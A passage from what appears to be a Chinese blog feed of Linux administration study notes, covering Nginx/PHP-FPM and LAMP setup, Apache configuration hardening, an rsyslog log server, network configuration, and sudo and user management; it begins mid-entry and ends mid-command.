title="四、源码包安装PHP并使Nginx可以解析PHP"></a>四、源码包安装PHP并使Nginx可以解析PHP</h3><blockquote><p><strong>Nginx默认不支持PHP解析</strong></p></blockquote><p><strong>1、</strong>PHP的依赖开发环境/运行库：<code>libxml2-devel</code>、<code>libjpeg-devel</code>、<code>libpng-devel</code></p><p><strong>2、</strong>压缩源码包</p><p><strong>3、</strong><code> ./configure --prefix=/usr/local/php5 --with-gd --with-zlib --with-config-file-path=/usr/local/php5 --enable-mbstring --enable-fpm --with-jpeg-dir=/usr/lib</code></p><blockquote><p>–with-gd：支持php处理图形的扩展库GD库</p><p>–with-zlib：支持提供数据压缩用的函式库zlib库</p><p>-with-config-file-path=/usr/local/php5：指定自己的php.ini路径</p><p> –enable-mbstring ：mbstring扩展库用于处理多字节字符串（有点像unicode补丁）</p><p>–enable-fpm：开启php-fpm（PHP FastCGI Process Manager）模块，PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。</p><p>–with-jpeg-dir=/usr/lib：设置libjpeg库的安装路径（支持jpeg图片格式）</p></blockquote><p><strong>4、</strong>编译安装：<code>make</code>、<code>make install</code></p><p><strong>5、</strong>先修改php配置文件(PREFIX/etc/php-fpm.conf)的default后缀（默认有后缀）；并将源码路径中的php.ini-development主配置文件拷贝一份到PREFIX/etc/php.ini（默认没有这个主配置文件）</p><p><strong>6、</strong>执行Prefix/sbin/php-fpm从而管理fastcgi（PHP）程序，开启后9000端口也随之开启。</p><p><strong>7、</strong>配置nginx服务器，使其支持PHP脚本并且指定FastiCGI管理服务的IP和端口</p><p>方法1、</p><blockquote><p><strong>PREFIX/conf/fastcgi_params</strong></p><p>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</p><p>加此条配置目的是告诉php-fpm管理进程php脚本的名字。</p></blockquote><hr><blockquote><p><strong>PREFIX/conf/nginx.conf</strong></p><p>66         location ~ \.php$ {</p><p>67             root           html;</p><p>68             fastcgi_pass   127.0.0.1:9000;</p><p>69             fastcgi_index  index.php;</p><p>70             fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</p><p>71             include        fastcgi_params;</p><p>72         }</p></blockquote><p>方法2、</p><blockquote><p><strong>PREFIX/conf/nginx.conf</strong></p><p>66         location ~ \.php$ {<br>67             root           html;<br>68             fastcgi_pass   127.0.0.1:9000;<br>69             fastcgi_index  index.php;<br>70             include        fastcgi_conf;<br>71         }</p><p>使用fastcgi_conf的话，配置文件里已经存在了<code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</code></p></blockquote><h3 id="五、LAMP的PHP和LNMP的PHP有什么不同？"><a href="#五、LAMP的PHP和LNMP的PHP有什么不同？" class="headerlink" title="五、LAMP的PHP和LNMP的PHP有什么不同？"></a>五、LAMP的PHP和LNMP的PHP有什么不同？</h3><p>LAMP中PHP是Apache的一个模块；而在LNMP中PHP独立存在，PHPCgi由PHP-FPM管理，PHP-FPM拥有自己的端口专门处理PHP解析。</p><blockquote><p>引自：<a href="https://www.cnblogs.com/donghui521/p/10334776.html">https://www.cnblogs.com/donghui521/p/10334776.html</a></p><p>目前主流的nginx+php的运行原理如下：<br>1、nginx的worker进程直接管理每一个请求到nginx的网络请求。<br>2、对于php而言，由于在整个网络请求的过程中php是一个cgi程序的角色，所以采用名为php-fpm的进程管理程序来对这些被请求的php程序进行管理。php-fpm程序也如同nginx一样，需要监听端口，并且有master和worker进程。worker进程直接管理每一个php进程。<br>3、关于fastcgi：fastcgi是一种进程管理器，管理cgi进程。市面上有多种实现了fastcgi功能的进程管理器，php-fpm就是其中的一种。再提一点，php-fpm作为一种fast-cgi进程管理服务，会监听端口，一般默认监听9000端口，并且是监听本机，也就是只接收来自本机的端口请求，所以我们通常输入命令 netstat -nlpt|grep php-fpm 会得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp    0   0 127.0.0.1:9000       0.0.0.0:*          LISTEN   1057&#x2F;php-fpm</span><br></pre></td></tr></table></figure><p>这里的127.0.0.1:9000 就是监听本机9000端口的意思。<br>4、关于fastcgi的配置文件，目前fastcgi的配置文件一般放在nginx.conf同级目录下，配置文件形式，一般有两种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcgi.conf  和 fastcgi_params。不同的nginx版本会有不同的配置文件，这两个配置文件有一个非常重要的区别：fastcgi_parames文件中缺少下列配置：</span><br><span class="line">fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span><br></pre></td></tr></table></figure><p>我们可以打开<code>fastcgi_params</code>文件加上上述行，也可以在要使用配置的地方动态添加。使得该配置生效。<br>5、当需要处理php请求时，nginx的worker进程会将请求移交给php-fpm的worker进程进行处理，也就是最开头所说的nginx调用了php，其实严格得讲是nginx间接调用php。 </p></blockquote><h3 id="六、LNMP的缺点"><a href="#六、LNMP的缺点" class="headerlink" title="六、LNMP的缺点"></a>六、LNMP的缺点</h3><p>PHP-FPM的负载能力有限，如果访问量特别大的话，PHP-FPM容易陷入僵死状态，浏览器显示：502 bad gateway错误。</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7、LAMP架构搭建</title>
      <link href="/2020/07/21/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/7%E3%80%81LAMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/07/21/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/7%E3%80%81LAMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="LAMP架构搭建"><a href="#LAMP架构搭建" class="headerlink" title="LAMP架构搭建"></a>LAMP架构搭建</h2><h3 id="一、什么是LAMP架构"><a href="#一、什么是LAMP架构" class="headerlink" title="一、什么是LAMP架构"></a>一、什么是LAMP架构</h3><p>LAMP架构就是Linux、Apache、Mysql、Php结合起来的运行环境。LAMP是比较流行的Web服务架构。</p><h3 id="二、部署Mysql服务端"><a href="#二、部署Mysql服务端" class="headerlink" title="二、部署Mysql服务端"></a>二、部署Mysql服务端</h3><p>1、yum源安装：<code>yum install -y mysql-server</code></p><p>2、启动Mysql服务：<code>service mysqld start</code></p><p>3、第一次修改root密码：<code>mysqladmin -u root password &quot;密码&quot;</code></p><p>4、第n次(n&gt;1)修改root密码：<code>mysqladmin -u root -p password &quot;新密码&quot;</code>,然后提示输入旧密码</p><p>5、登录数据库：<code>mysql -u root -p</code></p><h3 id="三、部署PHP语言环境"><a href="#三、部署PHP语言环境" class="headerlink" title="三、部署PHP语言环境"></a>三、部署PHP语言环境</h3><p>1、yum源安装：<code>yum install -y php</code></p><p>2、yum源安装PHPmysql驱动库：<code>yum install -y php-mysql/php-mbstring</code></p><p>3、php-mbstring在第二盘Centos光盘中，安全性考虑先卸载，再安装新的光盘：<code>umount /dev/cdrom</code>，换好光盘后再挂载光盘<code>mount /dev/cdrom /media</code></p><blockquote><p>因为手动挂载光盘到/media，yum配置以前的文件路径是/media/CentosXXX所以要将配置改为/media。而且这里要注意，光盘2中没有依赖文件列表，因此只能单纯安装某个依赖包，无法自动处理依赖，解决方法是挂载光盘1利用光盘1中的依赖文件列表先创建一个cache。然后光盘2就可以在cache中找到依赖文件列表处理依赖了。</p></blockquote><h3 id="四、PHP配置文件分析"><a href="#四、PHP配置文件分析" class="headerlink" title="四、PHP配置文件分析"></a>四、PHP配置文件分析</h3><blockquote><p>/etc/php.ini</p></blockquote><p>229行左右 ：<code>short_open_tag = On</code>        #开启PHP短标签模式，不需要&lt;?php，只需要&lt;?即可。</p><blockquote><p>配置好后需要重启Apache，测试一个致命的“裸体”函数：<code>&lt;? phpinfo(); ?&gt;</code></p><p>PHP必须依靠Web服务器才能工作，在Apache中PHP只是一个网页程序</p></blockquote><h3 id="五、PHP程序的工作流程"><a href="#五、PHP程序的工作流程" class="headerlink" title="五、PHP程序的工作流程"></a>五、PHP程序的工作流程</h3><p>1、WEB浏览器请求一个url操作。</p><p>2、如果是静态网页，那么Web服务器只需要正常返回HTML页面即可。</p><p>3、如果是PHP页面(XXX.php)，那么Web服务器会委托系统中的<strong>PHP预处理器</strong>(Preprocessor)将请求的php文件解释为HTML静态页面返回给WEB浏览器。</p><p>​    这个将PHP文件解释为HTML页面的过程，由PHP解释器进行，期间可能会有一些数据库的增删改查等操作，将数据库中的数据拼接到HTML页面后返回给WEB浏览器，这就是动态网页。</p><h3 id="六、PHPMyAdmin数据库WEB客户端软件"><a href="#六、PHPMyAdmin数据库WEB客户端软件" class="headerlink" title="六、PHPMyAdmin数据库WEB客户端软件"></a>六、PHPMyAdmin数据库WEB客户端软件</h3><p>一款基于PHP开发的数据库客户端Web管理页面，直接解压到<code>/var/www/html</code>下直接访问进行管理。</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、Apache网页服务器安全架构</title>
      <link href="/2020/07/21/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/6%E3%80%81Apache%E7%BD%91%E9%A1%B5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/"/>
      <url>/2020/07/21/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/6%E3%80%81Apache%E7%BD%91%E9%A1%B5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Apache网页服务器安全架构"><a href="#Apache网页服务器安全架构" class="headerlink" title="Apache网页服务器安全架构"></a>Apache网页服务器安全架构</h2><h3 id="一、什么是LAMP架构"><a href="#一、什么是LAMP架构" class="headerlink" title="一、什么是LAMP架构"></a>一、什么是LAMP架构</h3><p>LAMP架构就是Linux、Apache、Mysql、Php结合起来的运行环境。LAMP是比较流行的Web服务架构。</p><h3 id="二、Web服务工作原理"><a href="#二、Web服务工作原理" class="headerlink" title="二、Web服务工作原理"></a>二、Web服务工作原理</h3><p>1、用户在浏览器中执行一个请求操作</p><p>2、浏览器与网页服务器进程建立TCP连接</p><p>3、浏览器将请求操作按照Http协议打包为数据包发送到网页服务器</p><p>4、服务器进程对接受到的Http数据包解析，生成对应的响应Http数据包</p><p>5、将响应Http数据包发送给客户端浏览器</p><p>6、客户端浏览器对获得的应答Http数据包进行处理，显示等。</p><h3 id="三、Apache配置文件基本分析"><a href="#三、Apache配置文件基本分析" class="headerlink" title="三、Apache配置文件基本分析"></a>三、Apache配置文件基本分析</h3><p>57行左右：<code>ServerRoot &quot;/etc/httpd&quot;</code>    #Apach配置根路径</p><p>65行左右：<code>PidFIle run/httpd.pid</code>        #Apach服务的根进程号（相对配置根路径的相对路径）</p><p>136行左右：<code>Listen 80</code>        #Apache监听端口</p><p>150行后：<code>LoadModule XXXXX</code>        #Apache加载的一系列功能模块</p><p>221行左右：<code>Include conf.d/*.conf</code>        #导入的配置文件</p><p>242行左右：<code>User apache</code>        #配置Apache的进程用户</p><p>243行左右：<code>Group apache</code>        #配置Apache的进程组</p><p>292行左右：<code>DocumentRoot &quot;/var/www/html&quot;</code>        #Web网页的根目录</p><p>317-346行左右：<code>&lt;Directory &quot;/var/www/html&quot;&gt; XXXX &lt;/Directory&gt; </code>        #针对Web网页根目录的配置信息</p><h3 id="四、Apache服务器安全加固"><a href="#四、Apache服务器安全加固" class="headerlink" title="四、Apache服务器安全加固"></a>四、Apache服务器安全加固</h3><p><code>&lt;Directory &quot;/var/www/html&quot;&gt;</code></p><p><u>331行左右</u>：<code>Options FollowSymLinks</code>        #<strong>关闭目录共享功能</strong></p><p><u>343行左右</u>：<code>Order allow,deny</code>        #<strong>访问控制</strong>匹配列表中允许项，如果匹配不到全拒绝，下面写访问控制列表</p><blockquote><p>343行左右：<code>Order deny,allow</code>        #访问控制匹配列表中拒绝项，如果匹配不到全允许，下面写访问控制列表</p></blockquote><p><u>344行左右</u>：<code>Allow/Deny from all|host|env=[!]env-variable [host|env=[!]env-variable] ...</code>        #<strong>访问控制</strong>列表</p><blockquote><p>例子：拒绝整个网段 Deny from 192.168.1.</p></blockquote><p><u>345行左右</u>：<strong>设置主页通过认证的方式访问</strong></p><p>​    <code>authtype basic</code>    #认证类型<br>​    <code>authname &quot;随便&quot;</code>    #认证名称，会出现在认证提示语中<br>​    <code>authuserfile apache认证用户列表</code>    #specify认证用户的列表</p><blockquote><p>通过 <code>htppasswd -c 认证用户列表存放路径 认证用户列表名</code>来创建认证用户列表，通知注意对认证用户列表进行撤权，<code>chown apache </code>并且<code>chmod 400</code></p></blockquote><p>​    <code>require valid-user</code>    #允许此列表访问 </p><p><code>&lt;/Directory&gt; </code>        </p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5、日志服务器的搭建</title>
      <link href="/2020/07/20/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/5%E3%80%81%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/07/20/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/5%E3%80%81%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="日志服务器的搭建"><a href="#日志服务器的搭建" class="headerlink" title="日志服务器的搭建"></a>日志服务器的搭建</h2><h3 id="一、什么是日志"><a href="#一、什么是日志" class="headerlink" title="一、什么是日志"></a>一、什么是日志</h3><p>日志是记录系统活动信息的文件，默认系统运行产生的日志位于：/var/log。</p><p>一般记录什么时间、什么来源（IP）、什么用户、做了什么操作？</p><p>通过分析日志，有助于解决系统故障、查看非法行为等。</p><h3 id="二、日志的分类"><a href="#二、日志的分类" class="headerlink" title="二、日志的分类"></a>二、日志的分类</h3><p>1、系统服务日志：记录系统在运行中产生的事件变化（/var/log/messages）。</p><p>2、系统认证日志：何时何地谁尝试登陆系统，是否成功等（/var/log/secure）。</p><p>3、系统邮件服务日志：(/var/log/maillog)</p><p>4、系统定时任务日志：(/var/log/cron) </p><p>5、系统启动信息:（/var/log/boot.log）</p><h3 id="三、日志服务的配置文件"><a href="#三、日志服务的配置文件" class="headerlink" title="三、日志服务的配置文件"></a>三、日志服务的配置文件</h3><p>syslogd软件：/sbin/rsyslogd；syslog服务管理。</p><p>1、日志服务的配置文件：/etc/rsyslog.conf  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##MODULES####</span></span></span><br><span class="line">定义了UDP、TCP的日志监听模块</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##GLOBAL DIRECTIVES###</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ActionFileDeFaultTemplate***    定义了日志显示的格式</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IncludeConfig                根据路径导入配置文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##RULES###</span></span></span><br><span class="line">服务类型（连接符号）日志信息级别；（所有信息等级&gt;specify的日志信息写入右边的日志文件）</span><br><span class="line">*.info;    mail.none;    authpriv.none;    cron.none  /var/log/messages</span><br><span class="line">连接符号：</span><br><span class="line">.info 表示info等级以上</span><br><span class="line">.=info 表示info级别</span><br><span class="line">.!info 表示除了info级别，其他的所有级别</span><br></pre></td></tr></table></figure><p>2、日志级别</p><blockquote><p>1、debug    调试信息</p><p>2、info,        普通信息</p><p>3、notice,    提醒信息</p><p>4、warning, warn  (same  as  warning)    警告信息</p><p>5、err,error  (same  as  err),    错误信息</p><p>6、crit,     危机信息</p><p>7、alert,    警报信息</p><p>8、emerg, panic (same as     emerg)    紧急信息</p></blockquote><h3 id="四、日志备份——日志服务器的搭建"><a href="#四、日志备份——日志服务器的搭建" class="headerlink" title="四、日志备份——日志服务器的搭建"></a>四、日志备份——日志服务器的搭建</h3><blockquote><p>一旦服务器被入侵，日志文件被删除，依靠日志服务器中的备份日志，我们也可以对入侵行为进行分析。</p></blockquote><p>日志服务器分为客户端和服务端。</p><p>服务端：接受谁的日志？用什么协议和端口传输日志？存放在哪里？</p><p>客户端：发送什么级别什么服务的日志？用什么协议和端口传输日志？发给谁？</p><h4 id="日志服务器客户端的环境搭建"><a href="#日志服务器客户端的环境搭建" class="headerlink" title="日志服务器客户端的环境搭建"></a><strong>日志服务器客户端的环境搭建</strong></h4><p>1、客户端编辑日志配置文件/etc/rsyslog.conf写备份规则与服务器地址</p><blockquote><p>####begin forwarding rule####</p><p>#*.* @@remote-host：514</p><p>authpriv.*;    @@日志服务器IP：端口号   (@@TCP协议、@UDP协议)</p></blockquote><p>2、重启日志服务：<code>service rsyslog restart</code></p><h4 id="日志服务器服务端的环境搭建"><a href="#日志服务器服务端的环境搭建" class="headerlink" title="日志服务器服务端的环境搭建"></a><strong>日志服务器服务端的环境搭建</strong></h4><p>1、服务端编辑日志配置文件/etc/rsyslog.conf</p><blockquote><p><strong>####MODULES####</strong></p><p><strong>$ModLoad_imtcp（TCP协议）</strong></p><p><strong>$InputTCPServerRun 514（监听端口）</strong></p><p><strong>### end of the forwarding rule ###</strong></p><p>：属性    比较操作符    值        存放路径</p><p><strong>:fromhost-ip,isequal,”192.168.1.1”    /var/log/client/xiaozhi.log</strong></p><p>属性：fromhost，fromhost-ip，hostname</p><p>比较操作符：isequal startweith</p><p>值：匹配属性</p></blockquote><p>2、重启日志服务：<code>service rsyslog restart</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4、Linux网络配置</title>
      <link href="/2020/07/20/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/4%E3%80%81Linux%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/07/20/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/4%E3%80%81Linux%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux网络配置"><a href="#Linux网络配置" class="headerlink" title="Linux网络配置"></a>Linux网络配置</h2><h3 id="一、Linux网络配置（大部分临时）"><a href="#一、Linux网络配置（大部分临时）" class="headerlink" title="一、Linux网络配置（大部分临时）"></a>一、Linux网络配置（大部分临时）</h3><p><u>1、查看网络配置状态信息</u>：<code>ip addr</code>； </p><blockquote><p>lo 回环测试地址， ehX有线网卡， wlpXX 无线网卡</p></blockquote><p><u>2、临时关闭NetworkManager服务</u>：<code>service NetworkManager stop</code></p><p>设置345level下关闭该服务：<code>chkconfig --level 345 NetworkManager off</code></p><blockquote><p>NetworkManager是Centos中一个帮助linux用户自动配置、管理网络的守护进程服务程序，桌面右上角的图形化网络管理工具就是它。</p><p>Linux的7个level运行级别</p><p>0    关机</p><p>1    单用户模式，root用户（windows 安全模式）</p><p>2    多用户，没有NFS（Network File System ）</p><p>3    完全的多用户模式（正常系统开机模式），控制台界面</p><p>4    没有用到，保留位</p><p>5    Xserver，GUI图形化界面（我目前看到的所有都是这个级别。。）</p><p>6    重启</p></blockquote><p><u>3、配置网络地址IP</u></p><p>配置网卡网络地址：<code>ip addr add  IP地址/子网掩码 dev 网卡名</code></p><p>删除网卡上的网络地址配置：<code>ip addr del IP地址/子网掩码 dev 网卡名</code></p><p><u>4、配置网关/路由</u></p><p>配置网卡的网关/默认路由：<code>ip route add default via 192.168.2.254  dev eth0</code></p><p>查看网卡的路由状态：<code>ip route</code></p><blockquote><p>在学习数通安全时，我们把路由器和计算机看做相同ISO层的设备，就是因为他们拥有相同的能力。因此计算机也可以看作路由器，具有路由功能，所以也可以配置路由，相当于电脑的网关。</p></blockquote><p><u>5、DNS服务器配置文件</u>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;resolv.conf在其中配置一条 nameserver 202.106.0.20（北京的DNS服务器）</span><br></pre></td></tr></table></figure><p><u>6、开启网卡：</u><code>ip link set eth0 up</code>/<code>ifdown 网卡</code>/<code>ifup 网卡</code></p><h3 id="二、Linux网络配置（配置文件方式永久）"><a href="#二、Linux网络配置（配置文件方式永久）" class="headerlink" title="二、Linux网络配置（配置文件方式永久）"></a>二、Linux网络配置（配置文件方式永久）</h3><p>配置文件：/etc/sysconfig/network-scripts/ifcfg-ethX</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DEVICE&#x3D;eth0            #网卡名</span><br><span class="line">TYPE&#x3D;Ethernet        #网络类型，以太网</span><br><span class="line">ONBOOT&#x3D;yes            #是否由network服务管理此配置文件</span><br><span class="line">BOOTPROTO&#x3D;static    #静态获取&#x2F;dhcp</span><br><span class="line">IPADDR&#x3D;192.168.2.183    #IP地址</span><br><span class="line">NETMASK&#x3D;255.255.255.0    #子网掩码</span><br><span class="line">#NM_CONTROLLED&#x3D;yes    #是否由NetworkManager服务管理此配置文件</span><br><span class="line">#HWADDR&#x3D;XXXXXXXXX    #MAC地址</span><br><span class="line">GATEWAY&#x3D;192.168.2.254    #网关地址</span><br><span class="line">DNS1&#x3D;114.114.114.114    #配置DNS地址</span><br><span class="line">DNS2&#x3D;XXX                #备用DNS地址</span><br></pre></td></tr></table></figure><h3 id="三、实验：使用Centos作为路由器连通两个网段的主机"><a href="#三、实验：使用Centos作为路由器连通两个网段的主机" class="headerlink" title="三、实验：使用Centos作为路由器连通两个网段的主机"></a>三、实验：使用Centos作为路由器连通两个网段的主机</h3><blockquote><p>1、Win7主机网络internet-01，IP：192.168.1.1， 网关:192.168.1.254</p><p>​    Centos作为路由器eth0位于internet-01，IP：192.168.1.254，eth1位于internet-02，IP：100.1.1.1</p><p>Windows2003作为服务器位于internet-02，IP：100.1.1.2，网关：100.1.1.1</p><p><strong>开启数据包转发功能：/etc/sysctl.conf    net.ipv4.ip_forwarding=1</strong></p><p>关闭防火墙，SElinux。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3、Linux用户管理与权限相关</title>
      <link href="/2020/07/19/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/3%E3%80%81Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3/"/>
      <url>/2020/07/19/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/3%E3%80%81Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux用户管理与权限相关"><a href="#Linux用户管理与权限相关" class="headerlink" title="Linux用户管理与权限相关"></a>Linux用户管理与权限相关</h2><p>ACL相关介绍：<a href="https://www.ibm.com/developerworks/cn/linux/l-acl/">https://www.ibm.com/developerworks/cn/linux/l-acl/</a></p><h3 id="一、su、sudo与sudoers权限管理"><a href="#一、su、sudo与sudoers权限管理" class="headerlink" title="一、su、sudo与sudoers权限管理"></a>一、su、sudo与sudoers权限管理</h3><p><a href="http://linux.vbird.org/linux_basic/0410accountmanager.php#shadow_file">http://linux.vbird.org/linux_basic/0410accountmanager.php#shadow_file</a></p><p>1、普通用户</p><p>2、超级管理员 root</p><blockquote><p><strong>使用su进行用户切换时，加 - 和不加 - 是有很大区别的，加 - 是以切换的用户的login_shell登录，环境变量的资源都准确的是刚切换的用户的；而不加 - 只改变一小部分资源，大部分还是原来用户的。</strong></p><p><a href="https://imgchr.com/i/URunmT"><img src="https://s1.ax1x.com/2020/07/19/URunmT.png" alt="URunmT.png"></a></p></blockquote><p>su 和 sudo的区别？</p><blockquote><p><strong>su是switch user，如果是切换root，就需要使用超级管理员root的密码</strong></p><p><strong>sudo是暂时使用某用户的权限进行操作，一般使用超级管理员权限，但是只有在/etc/sudoers名单中的用户才能使用，使用时输入的的是当前用户的密码而非超级管理员密码。</strong></p><p><a href="https://imgchr.com/i/URMyef"><img src="https://s1.ax1x.com/2020/07/19/URMyef.png" alt="URMyef.png"></a></p></blockquote><p><strong>sudo的时间有效期</strong>：两次sudo命令5分钟以内就不用再次输入密码。</p><p><strong>/etc/sudoers的编辑方法</strong>：使用<code>visudo</code>命令编辑，如果有语法问题会报错。</p><p>/<strong>etc/sudoers设置权限的方法</strong>：</p><blockquote><p>账号/组名 | 主机名  | 可切换的身份  | 可下达的命令（绝对路径）</p><p><strong>用户</strong>： <code>user ALL=(ALL) ALL</code></p><p><strong>组</strong>：    <code>%group ALL=(ALL) ALL</code></p><p><strong>给用户设置某个指令的方法：</strong></p><p><code>user ALL=(ALL) !/usr/bin/passwd,!/usr/bin/passwd root,/usr/bin/passwd root </code>   #使用户只能帮忙修改密码，但是不能修改root的密码</p><p><strong>不需要密码使用sudo</strong>:<code>user ALL=(ALL) NOPASSWD: ALL</code></p><p>除了组可以统一规范多个用户的行为以外，还可以使用变量/别名的方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]# visudo  <span class="tag">&lt;<span class="name">==注意是</span> <span class="attr">root</span> 身份</span></span><br><span class="line"><span class="tag"><span class="attr">User_Alias</span> <span class="attr">ADMPW</span> = <span class="string">pro1,</span> <span class="attr">pro2</span>, <span class="attr">pro3</span>, <span class="attr">myuser1</span>, <span class="attr">myuser2</span></span></span><br><span class="line"><span class="tag"><span class="attr">Cmnd_Alias</span> <span class="attr">ADMPWCOM</span> = <span class="string">!/usr/bin/passwd,</span> /<span class="attr">usr</span>/<span class="attr">bin</span>/<span class="attr">passwd</span> [<span class="attr">A-Za-z</span>]*, !/<span class="attr">usr</span>/<span class="attr">bin</span>/<span class="attr">passwd</span> <span class="attr">root</span></span></span><br><span class="line"><span class="tag"><span class="attr">ADMPW</span>   <span class="attr">ALL</span>=<span class="string">(root)</span>  <span class="attr">ADMPWCOM</span></span></span><br></pre></td></tr></table></figure></blockquote><h3 id="二、-etc-shadow，-etc-passwd-etc-group文件分析"><a href="#二、-etc-shadow，-etc-passwd-etc-group文件分析" class="headerlink" title="二、/etc/shadow，/etc/passwd, /etc/group文件分析"></a>二、/etc/shadow，/etc/passwd, /etc/group文件分析</h3><p>用户名 | 密码密文 | 密码最近一次修改时间（1970.1.1起的相对天数）| 密码修改后多少天后才可以再修改 | 密码有效期 | 密码过期前提前几天进行警告 | 密码宽限时间（过期后登录会强制修改密码，过了宽限时间密码会失效，只能联系root进行操作）|  最终失效期（即使修改了密码也会失效，就是账户的寿命，比如可以用作收费授权）</p><p>SHA512加密，且使用了salt值一起加密，密码字段有三段$6$salt$密文，详情见鸟哥。</p><h3 id="三、用户管理相关操作命令"><a href="#三、用户管理相关操作命令" class="headerlink" title="三、用户管理相关操作命令"></a>三、用户管理相关操作命令</h3><blockquote><p><strong>Linux的用户是先有组后有用户，当创建用户没有指定基本组时，逻辑是先创建一个和用户名相同的组，然后该用户的基本组被默认设置为用户名相同的组。</strong></p><p><u><strong>用户创建管理等相关默认配置信息：/etc/login.defs</strong>，<strong>修改此文件可从根本打破linux的默认用户相关创建规则。</strong></u></p></blockquote><p><u>groupXXX</u>：</p><p><strong>增加组并指定组号</strong>：<code>groupadd -g 组号 组名</code></p><p><strong>修改组号</strong>：<code>groupmod -g 新组号 组名</code></p><p><strong>删除组：</strong><code>groupdel 组名</code></p><p><u>userXXX：</u></p><p><strong>增加用户并指定基本组和附加组：</strong><code>useradd -g 基本组 -G 附加组 新用户名</code></p><p><strong>添加用户并指定无家目录</strong>：<code>useradd -M 用户名</code></p><p><strong>添加用户并设置shell</strong>：<code>useradd -s shell程序（如/sbin/nologin）用户名</code></p><p><strong>设置用户的附加组与修改用户UID</strong>：<code>usermod -G 附加组号 -u UID号 用户名</code></p><p><strong>删除用户</strong>（连同家目录一起删除）：<code>userdel -r 用户名</code></p><p><u>passwd：</u></p><p><strong>设置用户密码：</strong><code>passwd 用户名</code>（密码四分之三原则，大小写、特殊字符、长度6位以上）</p><p><strong>将用户密码进行锁定，无法登录(在shadow密码前加了!!)：</strong><code>passwd -l(lock) 